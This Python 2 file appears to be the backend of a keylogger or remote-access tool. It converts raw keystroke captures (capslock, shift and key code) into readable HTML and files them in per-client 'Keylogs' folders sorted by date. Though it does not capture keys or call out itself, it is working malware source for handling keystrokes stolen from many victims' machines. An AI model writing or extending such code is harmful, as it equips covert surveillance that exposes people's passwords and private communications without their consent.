import os

def raw_to_html(raw):

    html_source = ''

    def update_key(k):
        if updatecode.has_key(k):
            return updatecode[k]
        else:
            return str(chr(k))

    shiftcodes = {
        49: '!', 50: '@', 51: '#', 52: '$', 53: '%',
        54: '^', 55: '&', 56: '*', 57: '(', 48: ')',
        189: '_', 187: '+', 219: '{', 221: '}', 220: '|',
        186: ':', 222: '"', 188: '&lsaquo;', 190: '&rsaquo;', 191: '?',
    }
    keycodes = {
        160: '', 161: '', 32: '&nbsp;',
        9: '<font color=#288DA1>{tab}</font>', 8: '<font color=#D32B4E>{del}</font>', 162: '', 163: '', 144: '',
        35: '', 34: '', 33: '', 36: '', 45: '', 145: '', 19: '', 13: '<br>'
    }
    updatecode = {
        189: '-', 187: '=', 219: '[', 221: ']', 220: '\\',
        186: ';', 222: '\'', 188: ',', 190: '.', 191: '/',
        96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
        101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
        111: '/', 106: '*', 109: '-', 107: '+',
        110: '.'
    }

    for capslock, shift, key_code in zip(raw[0::3], raw[1::3], raw[2::3]):

        if keycodes.has_key(key_code):
            key = keycodes[key_code]
        else:
            if capslock:
                if shift:
                    key = shiftcodes[key_code] if shiftcodes.has_key(key_code) else update_key(key_code).lower()
                else:
                    key = update_key(key_code).upper()
            else:
                if shift:
                    key = shiftcodes[key_code] if shiftcodes.has_key(key_code) else update_key(key_code).upper()
                else:
                    key = update_key(key_code).lower()

        html_source += key

    return html_source

def html_generator(client_id, data, storage):
    date_stamp = data['time'].split('_')[0]
    dir = check_client_storage(storage, client_id, date_stamp)
    html_file_path = os.path.join(dir, '%s.html' % data['time'])
    with open(html_file_path, 'w') as html_file:
        html_file.write(raw_to_html(data['logs']))
    return html_file_path


def check_client_storage(storage, client_id, date):
    screenshot_path = os.path.join(storage, client_id, 'Keylogs', date)
    if not os.path.exists(screenshot_path):
        os.makedirs(screenshot_path)
    return screenshot_path
